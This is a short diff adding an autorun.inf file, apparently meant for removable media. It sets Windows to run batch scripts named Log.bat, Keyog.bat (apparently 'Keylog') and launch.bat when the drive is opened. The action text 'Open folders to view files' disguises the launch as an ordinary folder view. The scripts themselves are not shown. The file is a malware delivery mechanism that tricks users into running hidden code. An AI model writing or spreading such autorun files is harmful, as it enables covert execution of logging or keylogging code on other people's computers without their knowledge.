@@ -1,0 +1,5 @@
+[autorun]
+open=Log.bat
+open=Keyog.bat
+action=Open folders to view files
+shell\open\command=launch.bat
